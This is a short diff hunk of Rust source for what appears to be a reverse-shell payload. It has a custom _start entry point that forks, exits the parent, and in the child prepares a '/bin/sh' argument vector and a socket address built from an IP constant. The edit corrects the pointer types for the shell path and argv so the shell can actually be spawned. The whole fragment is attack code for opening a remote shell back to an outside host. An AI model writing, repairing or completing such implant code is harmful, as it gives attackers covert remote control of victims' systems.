@@ -173,8 +173,8 @@ fn _start() -> ! {
     match fork() {
         Ok(ForkResult::Parent(child_pid)) => unsafe { exit(0) },
         Ok(ForkResult::Child) => {
-            let shell: &str = "/bin/sh\x00";
-            let argv: [*const &str; 2] = [&shell, core::ptr::null()];
+            let shell: &[u8] = b"/bin/sh\0";
+            let argv: [*const u8; 2] = [shell.as_ptr(), core::ptr::null()];
             let ip: u32 = ip_str_to_beu32(IP);
             let socket_addr = sockaddr_in {
                 sin_family: AF_INET as u16,
